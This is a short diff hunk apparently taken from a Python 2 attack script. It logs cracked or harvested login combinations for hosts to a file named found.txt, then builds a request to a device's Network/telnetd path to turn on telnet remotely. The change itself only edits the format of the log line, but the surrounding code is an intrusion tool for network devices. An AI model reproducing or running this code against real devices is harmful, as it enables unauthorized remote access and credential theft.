@@ -65,7 +65,7 @@ def enable_telnetd(header,path):
 	try:
 		text_file = open("found.txt", "a")
 		login_details = base64.b64decode(header)
-		text_file.write("Host: "+host+" Combo:"+login_details+"- \n")
+		text_file.write("Host: "+host+" Combo:"+login_details+" \n")
 		text_file.close()
 		print "[*] Enabling telnetd"
 		baseURL = "http://"+host+""+path+"Network/telnetd"
